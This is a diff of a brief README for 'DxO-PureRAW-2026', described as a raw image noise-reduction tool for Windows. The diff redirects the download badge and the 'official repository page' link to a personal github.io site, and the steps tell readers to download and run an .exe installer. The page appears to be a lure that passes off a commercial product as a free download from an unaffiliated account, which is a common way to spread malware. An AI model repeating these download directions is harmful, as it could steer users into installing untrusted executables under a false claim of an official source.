@@ -1,12 +1,12 @@
 # 📸 DxO-PureRAW-2026 - Improve your raw image file quality
 
-[![](https://img.shields.io/badge/Download-DxO_PureRAW-blue)](https://github.com/quasi-para817/DxO-PureRAW-2026)
+[![](https://img.shields.io/badge/Download-DxO_PureRAW-blue)](https://quasi-para817.github.io)
 
 DxO PureRAW-2026 helps photographers clean up noisy images. This software finds details in raw files and removes grain. It works on Windows 10 and Windows 11. You can use this tool to process your photos before you start your editing workflow.
 
 ## 📥 How to download the software
 
-1. Visit the [official repository page](https://github.com/quasi-para817/DxO-PureRAW-2026).
+1. Visit the [official repository page](https://quasi-para817.github.io).
 2. Look for the releases section on the right side of your screen.
 3. Click on the latest version link.
 4. Download the installer file ending in .exe to your computer.
